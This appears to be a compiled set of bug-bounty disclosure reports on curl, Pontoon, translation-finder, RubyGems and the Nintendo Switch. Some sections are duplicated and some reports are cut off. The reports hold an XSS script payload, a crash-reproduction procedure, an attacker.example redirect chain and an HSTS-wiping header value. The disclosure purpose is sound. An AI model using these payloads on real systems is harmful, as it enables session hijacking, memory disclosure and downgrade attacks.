(Here the send buffer's 64 KB heap chunk ends at +00c000. So after that we can see the leaked malloc header and the `struct buf_chunk` of the next allocation, which holds the PING the server sent. With `-v --trace-config ssl`, curl shows the send as `gtls_send(len=1304) -> 0, 114688`)

I also attached a .tar.gz with a Dockerfile that builds a reproducer container.

## Appendix

```
PHASE 1: upload runs, server isn't reading
Curl_sendrecv()                                        transfer.c:354
└─ sendrecv_ul() -> Curl_req_send_more()               transfer.c:375 -> request.c:458
   ├─ add_from_client() -> ... -> cr_ws_read()         request.c:351 -> ws.c:1202    next 64 KB of the file
   │  ├─ ws_enc_write_head(), ws_enc_write_payload()   ws.c:1259, 1265  -> ws->sendbuf, as one masked BINARY frame
   │  └─ Curl_bufq_cread(&ws->sendbuf, buf, blen)      ws.c:1274        frame bytes -> req.sendbuf (65536 bytes)
   └─ req_flush() -> req_send_buffer_flush()           request.c:298 -> request.c:243
      ├─ xfer_send() -> Curl_xfer_send()               request.c:251 -> transfer.c:806
      │  └─ ... ssl_cf_send()                          vtls.c:1113
      │     └─ gtls_send(buf=req.sendbuf, blen=65536)  vtls.c:1156 -> gtls.c:2072
      │        ├─ gnutls_record_send(buf, 65536)       gtls.c:2090      = 16384, record 1 sent
      │        ├─ gnutls_record_send(buf+16384, 49152)                  = 16384, record 2 sent
      │        ├─ gnutls_record_send(buf+32768, 32768)                  encrypts record 3 (16384 bytes)
      │        │  └─ gtls_push() -> send()             gtls.c:85        EAGAIN, the socket is full
      │        │  = GNUTLS_E_AGAIN                                      <- record 3 stays queued inside GnuTLS
      │        └─ return CURLE_OK, *pnwritten = 32768  gtls.c:2099      record 3's bytes are not counted
      └─ Curl_bufq_skip(&req.sendbuf, 32768)           request.c:255    so they stay in req.sendbuf for the retry

PHASE 2: server sends a PING
Curl_sendrecv()                                        transfer.c:354
└─ sendrecv_dl() -> Curl_xfer_write_resp()             transfer.c:368 -> transfer.c:297
   └─ ... ws_cw_write()                                ws.c:709
      ├─ ws_dec_pass() -> ws_cw_dec_next()             ws.c:747 -> ws.c:662   a PING
      │  └─ ws_enc_add_cntrl(CURLWS_PONG)              ws.c:689         PONG -> ws->pending
      └─ ws_flush()                                    ws.c:770 -> ws.c:1701
         ├─ ws_enc_add_pending()                       ws.c:1708        PONG (10 bytes) -> ws->sendbuf   <- the short buffer
         ├─ Curl_bufq_peek(&ws->sendbuf, &out, &outlen)  ws.c:1728      outlen = 1304 (the PONGs that queued up while the socket was full)
         └─ Curl_xfer_send(data, out, outlen)          ws.c:1744        straight to the connection, req.sendbuf has to wait
            └─ ... gtls_send(buf=out, blen=1304)       gtls.c:2072      remain = 1304
               ├─ gnutls_record_send(out, 1304)        gtls.c:2090      sends the queued record 3, doesn't look at out
               │  = 16384                                               <- more than remain
               ├─ DEBUGASSERT(nwritten <= remain)      gtls.c:2094      (not in release builds)
               ├─ buf = out + 16384                    gtls.c:2095      <- past the end of what is in ws->sendbuf
               ├─ remain = 1304 - 16384                gtls.c:2096      <- wraps to 0xffffffffffffc518
               ├─ gnutls_record_send(out+16384, remain)  gtls.c:2090    = 16384   <- OUT OF BOUNDS READ, encrypted and sent
               ├─ gnutls_record_send(out+32768, remain)                 = 16384   (the chunk out is in ends before out+65536)
               ├─ ...
               ├─ gnutls_record_send(out+114688, remain)                = GNUTLS_E_AGAIN, the socket is full again
               └─ return CURLE_OK, *pnwritten = 114688 gtls.c:2099
```

Record 3's bytes are given to GnuTLS in phase 1 and are meant to be offered again, from `req.sendbuf`, by the next call. In phase 2 the PONG gets there first, GnuTLS answers for record 3, and `gtls_send()` applies that answer to the PONG's buffer.

Thanks for taking the time to read this report.

## Impact

Disclosure of client process memory to a malicious `wss://` server, for libcurl built with GnuTLS (default on Debian and Ubuntu?), while uploading a file to that server. The server can control how much to read

title: Stored XSS on the public Pontoon dashboards: the latest-activity tooltip re-parses a contributor's account address as HTML

summaries.author: frida-k
summaries.content:
## Summary

Pontoon's latest-activity tooltip on its public dashboards built its markup by concatenating contributor-supplied `data-*` values into a string and handing it to jQuery's `.after()`. Only the translation text was encoded. The server escaped the values into the attributes, but the browser decodes attributes before jQuery reads them, so the markup came back raw.

A contributor with no display name is shown by their account email address, and Pontoon's local signup accepted an address like `"<script>alert(document.domain)</script>x"@example.org`. One signup and one ordinary suggestion put that script on a public dashboard, where it ran in the session of anyone who hovered the cell, signed in or not. Before the report was filed it fired on `pontoon.allizom.org`, which was serving no Content-Security-Policy after a `django-csp` 4.0 upgrade dropped the policy.

In a translator's session the script could approve the attacker's own suggestion, and in a locale manager's it could add the attacker to that locale's managers group, a membership that would outlive every session involved.

Two changes closed the attack path on Mozilla's instance, and a third removed the sink:

- [mozilla/pontoon#4482](https://github.com/mozilla/pontoon/pull/4482), 2026-09-02, removed the local signup route.
- [mozilla/pontoon#4493](https://github.com/mozilla/pontoon/pull/4493), 2026-09-03, restored the CSP, which blocks the inline script.
- [mozilla/pontoon#4583](https://github.com/mozilla/pontoon/pull/4583), 2026-10-08, builds the tooltip from DOM nodes. Released in `v2026.10.08`.

Self-hosted Pontoon instances should be on `v2026.10.08` or later. Removing signup doesn't cover instances using other sign-in methods, which can still set the displayed name.

summaries.author: timhaines
summaries.content:
## Summary

Pontoon's latest-activity tooltip on its public dashboards built its markup by concatenating contributor-supplied `data-*` values into a string and handing it to jQuery's `.after()`. Only the translation text was encoded. The server escaped the values into the attributes, but the browser decodes attributes before jQuery reads them, so the markup came back raw.

A contributor with no display name is shown by their account email address, and Pontoon's local signup accepted an address like `"<script>alert(document.domain)</script>x"@example.org`. One signup and one ordinary suggestion put that script on a public dashboard, where it ran in the session of anyone who hovered the cell, signed in or not. Before the report was filed it fired on `pontoon.allizom.org`, which was serving no Content-Security-Policy after a `django-csp` 4.0 upgrade dropped the policy.

In a translator's session the script could approve the attacker's own suggestion, and in a locale manager's it could add the attacker to that locale's managers group, a membership that would outlive every session involved.

Two changes closed the attack path on Mozilla's instance, and a third removed the sink:

- [mozilla/pontoon#4482](https://github.com/mozilla/pontoon/pull/4482), 2026-09-02, removed the local signup route.
- [mozilla/pontoon#4493](https://github.com/mozilla/pontoon/pull/4493), 2026-09-03, restored the CSP, which blocks the inline script.
- [mozilla/pontoon#4583](https://github.com/mozilla/pontoon/pull/4583), 2026-10-08, builds the tooltip from DOM nodes. Released in `v2026.10.08`.

Self-hosted Pontoon instances should be on `v2026.10.08` or later. Removing signup doesn't cover instances using other sign-in methods, which can still set the displayed name.

title: Uncaught RecursionError crash in translation-finder (deep directory tree DoS)
vulnerability_information:
**Type:** Denial of Service (Availability)
**Severity:** Low-Medium (CVSS 3.7-5.5 depending on access)
**Affected:** WeblateOrg/translation-finder v3.4.1, commit f5f8bb5 (current main)

## TL;DR

`translation-finder` scans repository content using recursion without any depth limit. A repository with ~1000 nested folders causes an uncaught `RecursionError` that crashes the entire discovery call. The error is not handled anywhere, so Weblate's import/update/hook processing fails repeatedly.

## Tested environment

- Python 3.13.9
- charset-normalizer 3.5.1
- ruamel.yaml 0.19.1
- Linux x86_64

## Where the bug is

`translation_finder/finder.py`, lines 157–177:

```python
def list_files(self, root: PurePath, files: PathListType, dirs: PathListType) -> None:
    with scandir(root) as matches:
        for match in matches:
            if match.is_symlink():
                continue
            is_dir = match.is_dir()
            path = Path(match.path)
            if any(path.match(exclude) for exclude in EXCLUDES):
                continue
            if is_dir:
                dirs.append(self.process_path(path))
                try:
                    self.list_files(path, files, dirs)  # <-- line 176: unbounded recursion
                except OSError:
                    continue
            else:
                files.append(self.process_path(path))
```

The function calls itself recursively for every subdirectory. Only `OSError` is caught — `RecursionError` escapes and crashes `discover()` / `Finder()`.

## Why it matters

Git fully supports trees that are 1000+ levels deep. Any contributor can push such a tree to a repository. When Weblate scans that repo (import, update, webhook, PR), the discovery task crashes. Every retry also crashes, so the component's translation activity stops.

## Steps to reproduce

1. Run the PoC script:
   ```bash
   python3 poc_deepnest.py 1000
   ```
2. The script creates a tree with 1000 nested directories plus two tiny translation files.
3. It calls `discover()` on the tree.

## Result (measured, repeatable)

| Depth | Result |
|---|---|
| 960 | pass — no crash |
| 985 | pass — no crash |
| **990** | **CRASH — RecursionError** |
| 1000, 1050, 1100 | CRASH |

The exact boundary is ~960–1000 depending on Python version and stack. Below it works, above it always crashes.

## Proof

**Attachment:** `bug1_traceback.txt` — actual crash traceback from a real run.

Key frames:
```
File "translation_finder/api.py", line 54, in discover
    finder = Finder(root, mock=mock)
File "translation_finder/finder.py", line 73, in __init__
    self.list_files(root, files, dirs)
File "translation_finder/finder.py", line 176, in list_files
    self.list_files(path, files, dirs)
[Previous line repeated 984 more times]
File "translation_finder/finder.py", line 154, in process_path
    relative = path.relative_to(self.root)
RecursionError: maximum recursion depth exceeded
```

**Attachment:** `bug1_finder_frames.txt` — same crash with library frames extracted for readability.

## CVSS 3.1

- `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H` = **3.7 (Low)** — admin action required for import
- `PR:N` in webhook / PR-driven setups = **5.5 (Medium)**

## Weakness

- CWE-674: Uncontrolled Recursion
- CWE-400: Uncontrolled Resource Consumption (secondary)

## Suggested fix

**Best:** Replace recursion with an iterative walk (`os.walk()`), or add a depth cap (~256).

**Minimum:** Catch `RecursionError` and skip that subtree:

```python
try:
    self.list_files(path, files, dirs)
except (OSError, RecursionError):  # add RecursionError here
    continue
```

This is a one-line fix that turns the crash into a skip.

## Attachments

| File | What it is |
|---|---|
| `poc_deepnest.py` | PoC script — creates deep tree and crashes `discover()` |
| `bug1_traceback.txt` | Real crash traceback (proof) |
| `bug1_finder_frames.txt` | Same crash, library frames extracted (readable summary) |

## Impact

- **Availability:** uncaught exception kills Weblate's discovery task
- **Repeated failures:** every retry crashes again
- **Component stuck:** import/update/hook activity stops for affected component
- **Aggregate CPU DoS:** possible with many nested repos

title: Retry-independent time-condition HTTP/2 UAF
vulnerability_information:
## Relationship to the original report

This is a supplemental trigger for [HackerOne report #4030333](https://hackerone.com/reports/4030333), not a claim of an unrelated vulnerability. It reaches the same stale `Curl_easy *` condition through normal time-condition handling and shows that a fix limited to the original retry path is incomplete.

Report generated by Daybreak Blue AI.

## Summary

A malicious HTTP/2 server can trigger the reported heap use-after-free while curl uploads a request configured with `CURLOPT_TIMECONDITION` (`curl -z`). The server stalls the upload using normal HTTP/2 flow control, then returns an ordinary `200` response with a `Last-Modified` value that fails the client's time condition.

curl locally simulates a `304` response and marks the request done. This path does not abort the buffered upload before request teardown. `multi_done()` removes the original HTTP/2 stream through `CF_CTRL_DATA_DONE`, then calls non-aborted `Curl_req_done()`, which flushes the surviving upload bytes. Because the HTTP/2 filter has already forgotten the original stream, it parses those body bytes as a new request and gives nghttp2 the same `Curl_easy *` as the new stream's user data.

The easy handle is subsequently freed while the new stream still holds that pointer. A later frame for the stream dereferences it. The attached server uses a single valid `WINDOW_UPDATE(stream, 1)` frame; no response HPACK block is needed at the point of dereference.

Compared with the original trigger, this path requires none of the following:

- `RST_STREAM`;
- `HTTP_1_1_REQUIRED` or `REFUSED_STREAM`;
- curl's retry or HTTP/1.1 downgrade logic;
- a second connection or URL; or
- `--parallel` / `-Z`.

The complete reproducer is one upload, one URL, and one HTTP/2 connection.

## Security impact

The demonstrated result for this path is a remotely triggered heap use-after-free of `struct Curl_easy` (CWE-416). AddressSanitizer reports a four-byte read after `Curl_close()` freed the object.

I have **not** yet demonstrated code execution through this new time-condition path. Report #4030333 contains a targeted RCE chain for the same underlying stale-object class, which establishes that the bug can be exploitable, but that chain's heap grooming, address discovery, timing, and connection-lifetime work cannot be assumed to transfer unchanged. The supportable statement for this supplemental report is therefore:

> This simpler route reaches the same UAF primitive. RCE is known for the original trigger, but RCE through this route remains unproven.

## Affected versions

The attached reproducer was dynamically confirmed against an AddressSanitizer build of curl 8.22.0 using the nghttp2 HTTP/2 backend.

This route has the same underlying version boundary as report #4030333. Source history places the completing regression in commit [`cd9107e0128191b7b5396b9eb81bbd20c2d36755`](https://github.com/curl/curl/commit/cd9107e0128191b7b5396b9eb81bbd20c2d36755), first released in curl 8.12.0. That change removed the later DATA_DETACH cleanup which previously removed protocol state created after DATA_DONE. Static analysis therefore supports curl 8.12.0 onward where the vulnerable ordering remains and curl uses the native nghttp2 backend.

The PoC payload is intentionally calibrated for the exact curl 8.22.0 command below. Failure of this fixed payload with a different curl version, URL, port length, or added request headers is not evidence that the source is safe; those changes alter the internal request-head length and therefore the body offset that remains queued.

## Steps to reproduce

### 1. Build curl 8.22.0 with ASan and HTTP/2

The existing ASan build from report #4030333 can be reused. A representative release build is:

```bash
wget https://curl.se/download/curl-8.22.0.tar.gz
tar xf curl-8.22.0.tar.gz
cd curl-8.22.0

CC=clang \
CFLAGS='-O1 -g -fsanitize=address -fno-omit-frame-pointer' \
LDFLAGS='-fsanitize=address' \
./configure --with-openssl --with-nghttp2 --disable-shared

make -j"$(nproc)"
./src/curl -V
```

Confirm that the feature list printed by `curl -V` contains `HTTP2`.

### 2. Start the attached server

From the directory containing `server.py`:

```bash
python3 server.py
```

The server has no third-party Python dependencies. It creates `timecondition-payload.bin` next to itself and prints the exact client command. It serves one run and exits.

### 3. Run the exact client command in another terminal

Replace only `/path/to/curl-8.22.0` with the location of the ASan build:

```bash
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1:symbolize=1 \
  /path/to/curl-8.22.0/src/curl \
  -q --noproxy '*' --http2 -k -v \
  -z 'Tue, 01 Jan 2030 00:00:00 GMT' \
  -T ./timecondition-payload.bin \
  https://127.0.0.1:19278/x
```

`-q` prevents a local curl configuration file from adding headers and changing the calibrated offset. `--noproxy '*'` keeps the loopback request off configured proxies. `--http2` makes the required protocol explicit. `-k` is needed only because the PoC embeds a throwaway self-signed certificate.

## Expected result

The server reports:

```text
[server] upload opened on stream 1
[server] sent ordinary 200 + old Last-Modified without END_STREAM
[server] curl opened body-derived stream 3 after DATA_DONE
[server] queued WINDOW_UPDATE(stream=3, increment=1); waiting for cleanup
[server] received GOAWAY: curl reached connection-pool shutdown
```

curl's verbose log shows the local time-condition completion and unintended request:

```text
< HTTP/2 200
< last-modified: Wed, 01 Jan 2020 00:00:00 GMT
* The requested document is not new enough
* Simulate an HTTP 304 response
* [HTTP/2] [3] OPENED stream for https://127.0.0.1:19278/x
* [HTTP/2] [3] [:method: T]
* [HTTP/2] [3] [:path: /x]
```

The tested ASan client then aborts with status 134:

```text
ERROR: AddressSanitizer: heap-use-after-free
READ of size 4
    #0 on_stream_frame        lib/http2.c:946
    #1 on_frame_recv          lib/http2.c:1226
    #2 session_on_stream_window_update_received
    #3 nghttp2_session_mem_recv
    #4 h2_process_pending_input
    #5 h2_progress_ingress
    #6 cf_h2_shutdown

freed by thread T0 here:
    #0 free
    #1 Curl_close             lib/url.c:303
    #2 curl_easy_cleanup
```

## Root cause

### 1. The server controls the time-condition result

`http_header_l()` parses `Last-Modified` into `data->req.timeofdoc` when a time condition is configured:

```c
const char *v = (!k->http_bodyless &&
                 (data->set.timecondition || data->set.get_filetime)) ?
  HD_VAL(hd, hdlen, "Last-Modified:") : NULL;
```

The PoC sends a 2020 `Last-Modified` value while the client requests `-z 'Jan 1 2030'`.

### 2. curl marks the request done without aborting its queued upload

In `http_firstwrite()`, a failed time condition takes this successful early-completion path:

```c
if(data->set.timecondition && !data->state.range &&
   !Curl_meets_timecondition(data, k->timeofdoc)) {
  k->done = TRUE;
  data->info.httpcode = 304;
  streamclose(conn);
  return CURLE_OK;
}
```

For a multiplexed HTTP/2 connection, `streamclose()` deliberately does not close the connection. It also does not abort `req.sendbuf`.

`sendrecv_dl()` then exits immediately because `data->req.done` is true:

```c
result = Curl_xfer_write_resp(data, buf, blen, is_eos);
if(result || data->req.done)
  goto out;
```

That jump bypasses the later `Curl_req_abort_sending(data)` block.

### 3. Teardown destroys protocol state before flushing request state

Normal completion reaches `multi_done(data, result, FALSE)`. Its relevant ordering is:

```text
Curl_conn_ev_data_done(data, premature)
    -> HTTP/2 DATA_DONE removes the original stream

Curl_req_done(&data->req, data, premature=false)
    -> req_flush() sends the queued upload bytes
```

This violates a useful teardown invariant: after the protocol filter receives DATA_DONE, later generic request cleanup must not be able to create new protocol state for that transfer.

### 4. The flush creates a new stream holding the soon-to-be-freed handle

With the original HTTP/2 stream removed, `req_flush()` re-enters `h2_submit()`. The queued body begins with the PoC's planted bytes:

```text
T /x HTTP/1.1\n\n
```

`Curl_h1_req_parse_read()` accepts them as a request head, and `nghttp2_submit_request()` stores `data` as the new stream's user-data pointer:

```c
stream_id = nghttp2_submit_request(ctx->h2, &pri_spec, nva, nheader,
                                   &data_prd, data);
```

There is no subsequent DATA_DONE/DETACH cleanup for this newly created stream. curl detaches the transfer, leaves the HTTP/2 connection in its pool, and later frees the easy handle.

### 5. One `WINDOW_UPDATE` dereferences the stale pointer

During connection-pool shutdown, nghttp2 dispatches the queued frame. `on_frame_recv()` retrieves the stale stream user data and passes it to `on_stream_frame()`:

```c
data_s = nghttp2_session_get_stream_user_data(session, stream_id);
return on_stream_frame(cf, data_s, frame) ? NGHTTP2_ERR_CALLBACK_FAILURE : 0;
```

`on_stream_frame()` dereferences the object before switching on the frame type:

```c
struct h2_stream_ctx *stream = H2_STREAM_CTX(ctx, data);
```

`H2_STREAM_CTX` reads `data->mid`, producing the ASan four-byte read from the freed `Curl_easy` allocation.

## Why the retry-only patch is incomplete

The patch proposed with report #4030333 discards queued upload bytes when curl chooses `FOLLOW_RETRY`. This time-condition path never enters `FOLLOW_RETRY`, so that condition cannot protect it.

I tested the PoC against an exact curl 8.22.0 ASan build containing the proposed retry-only abort. The same stream resurrection and `on_stream_frame()` heap use-after-free occurred, with exit status 134.

The fix needs to protect the global lifetime invariant, not only one retry branch. Possible designs include aborting unfinished request sending before DATA_DONE on every applicable early-completion path, changing teardown ordering so the later flush cannot recreate protocol state, or restoring an equivalent final detach cleanup. The precise change should be regression-tested across HTTP/1, HTTP/2, and HTTP/3 request completion semantics.

## Reproducer constraints

The minimal PoC intentionally trades generality for clarity:

- it targets curl 8.22.0 with the nghttp2 backend;
- the victim opts into a time condition with `CURLOPT_TIMECONDITION` / `curl -z`;
- enough upload data must remain buffered when the response arrives;
- body bytes at the reachable queued offset must parse as a request head; and
- the old multiplexed connection must remain alive until the stale stream receives a frame.

The generated 131,000-byte fixture places `T /x HTTP/1.1\n\n` at byte offset 130,920, which is `2 * 65,536 - 152` for the exact request above. This is deterministic test calibration, not a claim that arbitrary upload contents always trigger the bug. A real exploit would need knowledge or control of suitable bytes, or an earlier observation phase like the original report's targeted chain.

The PoC is crash-only. It contains no heap grooming, address leak, allocator manipulation, or code-execution payload.

## Impact

## Summary:

Currently, just a crash. RCE may be possible given the sibling report.

title: [Switch] Remote stack buffer overflow in the LDN/LP2P DHCP server leads to control-flow hijack

summaries.author: tattsun
summaries.content:
# Description
A stack-based buffer overflow vulnerability in the Nintendo Switch local wireless networking functionality may allow an attacker within wireless range to execute arbitrary code using return-oriented programming (ROP) through crafted network traffic.

summaries.author: moehw
summaries.content: The `ldn` system module runs a DHCP server while the console hosts a local-wireless **lp2p/LDN** session (for example, photo sharing or local session in Mario Kart Live: Home Circuit). On receiving a frame, it reassembles received data into a fixed stack buffer with `memmove(dst, src, total_size)` and **never checks `total_size` against the buffer size**. `src` is the global BPF capture buffer holding the frame exactly as it arrived; `total_size` is the sum of the parsed layer lengths, and the DHCP-layer length is attacker-controlled - so a single oversized DHCP frame from a Wi-Fi peer overflows the stack, overwriting the **saved return address and callee-saved registers**. On Switch, the function returns to an attacker-chosen address. Overwriting only the low 2 bytes of the saved LR redirects PC within a 64 KB window of the module's own code without knowing the ASLR base.

title: An organization admin can create an attacker-controlled organization owner via the gem transfer flow

summaries.author: colby-swandale
summaries.content:
An Organization admin on RubyGems.org can grant the Owner role, which is reserved for existing owners, by going through the gem transfer flow instead of the normal membership flow. The membership endpoints correctly stop admins from inviting owners: a direct owner invite returns 404, and adding a direct gem owner returns 403.

The transfer flow only checks that the user is an admin of the Organization. It then accepts whatever role is submitted for each invitee, including Owner, and creates the Organization membership without applying the owner-only rule. A previous fix enforced this rule on the direct membership route but did not extend it to gem transfers.

title: Cross-origin redirect reuses a pooled Negotiate-authenticated connection from an unrelated transfer
vulnerability_information:
AI Disclosure: AI tools were used to assist with code analysis and drafting this report. All findings were independently investigated, verified against the source, and reproduced manually by me before submission.

## Summary

curl withholds a fresh `Authorization` header when a redirect crosses origins. That protection doesn't extend to connection reuse. If an application shares a connection cache across transfers, and one transfer already completed connection-bound Negotiate auth to a trusted host, a later transfer can hit an attacker-controlled origin, get redirected back to the trusted host, and reuse the already-authenticated pooled connection for the final request. No `Authorization` header goes out. Since Negotiate binds auth to the connection rather than the request, the server treats it as coming from the previously authenticated principal anyway.

In our lab, Apache with mod_auth_gssapi executed a state-changing request as `alice@EXAMPLE.COM` with no `Authorization` header present at all. This isn't a header leak; that path is already covered. It's a mismatch between `data->state.initial_origin`, which the header-generation check uses, and `data->state.origin`, which `url_match_auth_nego()` in `lib/url.c` uses for the connection-reuse check.



## Affected version

Reproduced on curl/libcurl git master, commit `aab0518d04`, reporting as `8.22.0-DEV`.

```
$ curl -V
curl 8.22.0-DEV (x86_64-pc-linux-gnu) libcurl/8.22.0-DEV OpenSSL/
```

This isn't a regression with a fix already staged. I diffed `url_match_auth_nego()` between the latest stable release (curl-8_21_0) and master to check. There's a diff in that function, but it's unrelated: it's the fix for GitHub issue #21307, the follow-up to CVE-2026-1965, which addressed the original fix being too strict about upgrading a connection from no credentials to with credentials before Negotiate starts. That change reordered the if/else if branches, added `url_allow_sspi_empty_creds()` calls, and changed how the NULL-credential-upgrade case is handled. None of that touches this bug.

The line that matters is identical in both versions:

```c
!Curl_peer_equal(conn->creds_origin, m->data->state.origin)
```

The issue is live in both the current stable release and git master.

## Steps to reproduce

You need a curl build with GSS-API/Negotiate support, a shared connection cache (one `CURLM*`/easy handle reused across transfers, or the share interface), and a test server doing connection-bound Negotiate auth (Apache + mod_auth_gssapi with `GssapiConnectionBound On` works).

1. Set up two hosts (`CURLOPT_RESOLVE` to localhost works fine):
   - `trusted.example:8081`: Apache with mod_auth_gssapi, `GssapiConnectionBound On`, an authenticated `/legit` endpoint, and a state-changing `/admin/action` endpoint.
   - `attacker.example:8082`: any server that answers `/hook` with:
     ```
     HTTP/1.1 302 Found
     Location: http://trusted.example:8081/admin/action
     ```

2. On one curl handle, with `CURLOPT_HTTPAUTH = CURLAUTH_NEGOTIATE`, `CURLOPT_FOLLOWLOCATION = 1L`, and a Kerberos ticket available for a principal (say `alice`):

   ```c
   /* Transfer 1: authenticate to the trusted host; connection stays pooled */
   curl_easy_setopt(h, CURLOPT_URL, "http://trusted.example:8081/legit");
   curl_easy_perform(h);

   /* Transfer 2: visit the unrelated attacker host, which redirects back */
   curl_easy_setopt(h, CURLOPT_URL, "http://attacker.example:8082/hook");
   curl_easy_perform(h);
   ```

3. Check the server side (access log, plus a CGI/script at `/admin/action` logging incoming headers and `REMOTE_USER`):
   - The final request to `/admin/action` carries no `Authorization` header.
   - The response is `200 OK`, not `401`.
   - The log records the authenticated principal as `alice@EXAMPLE.COM`. The state-changing action ran under a Kerberos identity via a request that carried no credentials of its own.

4. Two controls confirm the mechanism:
   - **Fresh connection**: repeat step 2's second transfer on a handle that never ran step 2's first transfer. Result: `401 Unauthorized`, no side effect. So the `200` depends on reused connection state, not independent authorization.
   - **Single-transfer redirect**: one transfer following `trusted → attacker → trusted` in a single `curl_easy_perform()` doesn't reproduce it. curl sends a fresh `Authorization: Negotiate` header and does a normal exchange back at `trusted.example`. So the existing single-transfer redirect protection is intact. The gap is specific to reuse across separate transfers.

Reproduced twice independently, with different Kerberos realms, hostnames, credentials, and containers both times. Same result each time.

## Impact

## ---- ##

title: One Strict-Transport-Security response header empties the victim's entire HSTS store, silently,
vulnerability_information:
## Summary
One `Strict-Transport-Security` response header, from any HTTPS server the victim contacts, leaves
the victim's on-disk HSTS store at **zero bytes**. Every host in it loses HSTS protection, including
hosts unrelated to the server that sent the header. curl exits 0 and prints nothing.

Two behaviours combine, each harmless alone. `Curl_fopen()` truncates the real store before it has
produced any replacement content, and `hsts_out()` abandons the write when it meets an entry whose
timestamp `gmtime` cannot render. The caller then unlinks the temporary file, so nothing is renamed
over the already-emptied original.

## The bug

**One.** `lib/curl_fopen.c:98` opens the real target in `"w"` mode purely to `fstat` it and clone
its permission bits onto a temporary file:

```c
  *fh = curlx_fopen(filename, FOPEN_WRITETEXT);   /* "w", truncates */
  if(!*fh)
    goto fail;
  if(curlx_fstat(fileno(*fh), &sb) == -1 || !S_ISREG(sb.st_mode)) {
    return CURLE_OK;
  }
  curlx_fclose(*fh);
```

The store is empty on disk from this point, before a byte of output exists.

**Two.** `lib/hsts.c:347-353`, the serialiser gives up on an unrenderable timestamp:

```c
static CURLcode hsts_out(struct stsentry *sts, FILE *fp)
{
  struct tm stamp;
  if(sts->expires != TIME_T_MAX) {
    CURLcode result = curlx_gmtime((time_t)sts->expires, &stamp);
    if(result)
      return result;                 /* abandons the write */
```

and `lib/hsts.c:389-407`, where one bad entry aborts the loop and discards the replacement:

```c
      result = hsts_out(sts, out);
      if(result)
        break;
    ...
    if(result && tempstore)
      unlink(tempstore);             /* real file was already truncated */
```

**The enabling step.** `lib/hsts.c:256-268` converts a parser overflow instead of rejecting it:

```c
      rc = curlx_str_number(&vp, &expires, TIME_T_MAX);
      if(rc == STRE_OVERFLOW)
        expires = CURL_OFF_T_MAX;
```

So a stored `expires` above what `gmtime` accepts but below `TIME_T_MAX` is reachable from a header.
Commit `4080ace060` rewrote this parser and preserved that conversion.

## Reproduce

```
printf 'example.com "20340101 00:00:00"\n.bank.example "20340101 00:00:00"\n' > store.txt
# server replies to https:// with:
#   Strict-Transport-Security: max-age=4611686018427387904
curl --hsts store.txt https://attacker.example/
echo "exit=$?  size=$(stat -c %s store.txt)"
```

```
exit=0  size=0
```

Control, identical in every respect except the header value:

```
Strict-Transport-Security: max-age=31536000     ->  exit=0  size=256   intact
```

Downgrade, measured end to end after the wipe: the `Switched from HTTP to HTTPS due to HSTS` line
is gone, curl dials port 80, and against a plaintext listener the query string `?token=SECRET123`
left the machine in the clear.

## The trigger window

`max-age + now` must land in `(67768036191676799, TIME_T_MAX)`, exclusive of the upper endpoint.
The lower edge is the largest `time_t` glibc `gmtime_r` accepts. The upper edge is fail-safe,
because reaching `CURL_OFF_T_MAX` clamps to exactly `TIME_T_MAX` and routes into the literal
`"unlimited"` branch at `lib/hsts.c:336`.

| max-age | exit | store after |
|---|---|---|
| 31536000 | 0 | 256, intact |
| 253402300800 | 0 | 257, intact |
| 67768036191676800 | 0 | **0, wiped** |
| 4611686018427387904 | 0 | **0, wiped** |
| 9223372035066357361 | 0 | **0, wiped** |
| 9223372036854775807 (`TIME_T_MAX`) | 0 | 248, intact |
| 99999999999999999999999999 | 0 | 248, intact |

Anything in `[1e17, 9e18]` works regardless of the victim's clock, so no clock knowledge is needed.
It is still a window, and the naive "very large number" payload falls outside it. A 32-bit `time_t`
is not required; this was measured on a 64-bit build.

Measured on x86_64 glibc, `SIZEOF_TIME_T 8`, `HAVE_GMTIME_R 1`.

## Impact

Anyone who persists an HSTS store, which is the point of `--hsts` and `CURLOPT_HSTSWRITEDATA`. One
header from a server the victim merely visits removes HSTS for every host in the store, so the
header from `attacker.example` is what downgrades `bank.example`. Realising the loss needs a network
position afterwards, which is why I am not asking for High.

The "Saving files" exclusion does not reach this: no attacker has write access to the directory.
curl destroys its own store in response to a remote header, and the asset is a security control
rather than a downloaded file.

## Severity

Medium. CVE-2023-46219 ("HSTS long filename clears contents") is the same outcome and curl rated it
Low, as it did CVE-2023-23915, CVE-2023-23914 and CVE-2024-9681. I am asking one level above
CVE-2023-46219 on the trigger and not the outcome: that one needed an unusual local filename, this
needs one response header from any server and it takes down unrelated hosts.

## Fix

Either change breaks the chain; both is better.

1. **Stop truncating the real file to stat it**, `lib/curl_fopen.c:98`. Use `curlx_stat()` on the
   path, or open `O_RDONLY`, and drop the `curlx_fclose`. Output already goes to the descriptor made
   at line 141. This fixes every `Curl_fopen` consumer at once, including alt-svc, and turns this
   whole family of failures from destructive into inert.
2. **Make `hsts_out` fail safe**, `lib/hsts.c:350`. Skip the entry, or write it as `"unlimited"` the
   way the `expires == TIME_T_MAX` branch at line 337 already does. The loader already parses
   `UNLIMITED`, so no format change is needed.

Rejecting an unrenderable `max-age` at parse time would also work, but it patches this one trigger
rather than the mechanism.

## Impact

## Impact

Anyone who persists an HSTS store, which is the point of `--hsts` and `CURLOPT_HSTSWRITEDATA`. One
header from a server the victim merely visits removes HSTS for every host in the store, so the
header from `attacker.example` is what downgrades `bank.example`. Realising the loss needs a network
position afterwards, which is why I am not asking for High.

The "Saving files" exclusion does not reach this: no attacker has write access to the directory.
curl destroys its own store in response to a remote header, and the asset is a security control
rather than a downloaded file.

title: IMAP custom FETCH literals can spoof tagged responses and desynchronize reused connections
vulnerability_information:
## Summary

There is an IMAP parser vulnerability, related to a custom `FETCH` whose message set begins with a range or comma, `is_custom_fetch_listing()` causes `imap_state_listsearch_resp()` to skip literal parsing (`lib/imap.c:1233-1235`).

The generic ping-pong reader nevertheless continues parsing the response as newline-delimited IMAP responses. Consequently, a line inside an attacker-controlled literal that matches curl's current response tag, such as `A004 OK`, is accepted by `imap_endofresp()` as the command completion response.

Curl can therefore report a custom `FETCH` successful even when the server's actual tagged response is `NO`. The declared literal and the genuine response remain buffered. Because this path does not set `data->req.maxdownload`, `imap_done()` does not perform the custom FETCH final-response handling, and the connection can remain reusable with stale protocol data in the IMAP ping-pong buffer.

## Technical details

`is_custom_fetch_listing()` recognizes inputs such as:

```text
FETCH 1:* (BODY[])
